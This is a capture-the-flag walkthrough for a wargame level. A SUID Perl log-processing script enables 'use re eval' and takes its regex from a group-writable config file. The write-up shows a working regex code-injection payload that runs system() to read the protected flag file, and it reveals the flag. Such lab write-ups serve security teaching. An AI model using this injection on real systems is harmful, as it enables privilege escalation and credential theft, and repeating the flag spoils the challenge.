# Level 06

The files in `/opt/snowcrash/level06` this time are a perl binary and its source code.

We cannot write over the binary, but we see something very interesting when we search for info :

```bash
$ stat /opt/snowcrash/level06/raven
  File: /opt/snowcrash/level06/raven
  Size: 16224     	Blocks: 32         IO Block: 4096   regular file
Device: 8,2	Inode: 394425      Links: 1
Access: (4550/-r-sr-x---)  Uid: ( 2006/  flag06)   Gid: ( 4006/   raven)
Access: 2026-09-10 09:52:42.009678547 +0000
Modify: 2026-06-09 19:03:45.188885849 +0000
Change: 2026-06-09 19:03:45.760960079 +0000
 Birth: 2026-06-09 19:03:45.179884681 +0000
```

The access info (`4550/-r-sr-x---`) has the SUID flag set for user `flag06`. That means that whenever we execute the binary, we execute it as `flag06` and thus have access to `/home/flag06/.flag`.

Right off the bat, in the script, we can see a famous vulnerability :

```perl
use re 'eval';
```

`use re 'eval'` enables Perl's regex engine to evaluate code embedded in a regular expression, such as `(?{ ... })`. Below, we find, in the function `process-log-file` :

```perl
if ($line =~ /$pattern/) {
    $file_matched++;
    $stats{matched}++;
}
```

and further below :

```perl
for my $f (@files) {
    process_log_file($f, $CONFIG{loglevel_pattern});
}
```

The pattern is set through the config file, so we need to modify it to be able to access the password. The config file is hard coded at the top of the file as : `/etc/raven/raven.conf`. We check for access :

```bash
$ ls -l /etc/raven/raven.conf 
-rw-rw-r-- 1 root raven 170 Sep 11 09:26 /etc/raven/raven.conf
$ groups
level06 levelgroup raven
```

We can write inside, thanks to our group `raven`. We need 2 things, the eval injection, and a log folder that we can access. Here is the new conf file :

```ini
# raven configuration
log_dir          = /tmp/level06
max_size         = 10485760
retention_days   = 7
loglevel_pattern = (?{ system("cat /home/flag06/.flag"); exit }).*
```

The eval injection is made by this line : `loglevel_pattern = (?{ system("cat /home/flag06/.flag"); exit }).*`. The system call is executed for every line (thus the exit). We also modify the log_dir to a folder that we can read and write in. We also put a log file inside, here flag.log, but the content is irrelevant.

We now execute the binary, and we get exactly the flag, that is : wizelohxamaiuiia2uinaes4a